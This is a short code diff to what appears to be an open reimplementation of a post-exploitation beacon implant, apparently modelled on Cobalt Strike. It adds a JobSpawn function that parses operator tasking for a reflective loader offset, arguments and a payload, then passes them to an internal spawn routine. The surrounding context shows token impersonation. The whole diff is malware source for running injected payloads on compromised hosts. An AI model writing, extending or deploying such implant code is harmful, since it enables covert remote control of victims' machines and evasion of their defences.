@@ -1,5 +1,7 @@
 #include "pch.h"
 
+#include "job.h"
+
 #include "beacon.h"
 #include "identity.h"
 #include "pipe.h"
@@ -234,4 +236,27 @@ void JobSpawnInternal(int callbackType, int waitTime, int reflectiveLoaderOffset
 	}
 
 	IdentityConditionalImpersonate(ignoreToken);
+}
+
+void JobSpawn(char* buffer, int size, BOOL x86, BOOL ignoreToken)
+{
+#define MAX_DESCRIPTION 64
+	datap* locals = BeaconDataAlloc(MAX_DESCRIPTION);
+	char* description = BeaconDataPtr(locals, MAX_DESCRIPTION);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, size);
+	short callbackType = BeaconDataShort(&parser);
+	short waitTime = BeaconDataShort(&parser);
+	int reflectiveLoaderOffset = BeaconDataInt(&parser);
+	int descriptionLength = BeaconDataStringCopySafe(&parser, description, MAX_DESCRIPTION);
+	int argumentLength = BeaconDataInt(&parser);
+	char* argument = argumentLength ? BeaconDataPtr(&parser, argumentLength) : NULL;
+	char* payload = BeaconDataBuffer(&parser);
+	int payloadLength = BeaconDataLength(&parser);
+
+	JobSpawnInternal(callbackType, waitTime, reflectiveLoaderOffset, payload, payloadLength, argument, argumentLength, description, descriptionLength, x86, ignoreToken);
+
+	BeaconDataFree(locals);
+
 }
